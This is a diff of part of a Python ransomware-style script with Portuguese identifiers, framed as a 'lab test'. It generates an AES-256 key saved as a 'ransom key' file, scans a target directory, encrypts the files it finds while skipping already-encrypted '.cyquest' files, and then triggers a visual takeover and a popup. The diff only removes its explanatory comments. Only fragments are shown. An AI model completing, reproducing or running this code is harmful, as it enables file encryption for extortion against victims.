@@ -8,9 +8,9 @@ from interface import injetar_impacto_visual, disparar_popup
 
 
 EXTENSOES_IGNORADAS = {
-    ".cyquest",   # já criptografado
-    ".key",       # chave
-    ".py",        # arquivos do projeto
+    ".cyquest",   
+    ".key",       
+    ".py",        
     ".exe",
     ".dll"
 }
@@ -39,7 +39,7 @@ def executar_teste_laboratorio():
         print(f"[-] Crie a pasta {diretorio_alvo} com arquivos de teste.")
         return
 
-    # 🔑 1) GERAR CHAVE AES-256
+
     chave_mestra = os.urandom(32)
 
     with open("chave_resgate.key", "wb") as key_file:
@@ -47,7 +47,7 @@ def executar_teste_laboratorio():
 
     print("[+] Chave AES-256 gerada")
 
-    # 🔎 2) VARREDURA
+   
     print("[*] Escaneando diretório...")
     arquivos_encontrados = escanear_diretorio(diretorio_alvo)
 
@@ -55,7 +55,7 @@ def executar_teste_laboratorio():
     total_criptografados = 0
     erros = 0
 
-    # 🔐 3) CRIPTOGRAFIA
+ 
     for categoria, lista_paths in arquivos_encontrados.items():
 
         if not lista_paths:
@@ -79,11 +79,11 @@ def executar_teste_laboratorio():
                 print(f"[ERRO] {caminho.name}: {e}")
                 erros += 1
 
-    # 🎨 4) IMPACTO VISUAL
+  
     print("\n[*] Aplicando interface de impacto...")
     injetar_impacto_visual(diretorio_alvo)
     disparar_popup()
 
-    # 📊 
+
 
 executar_teste_laboratorio();
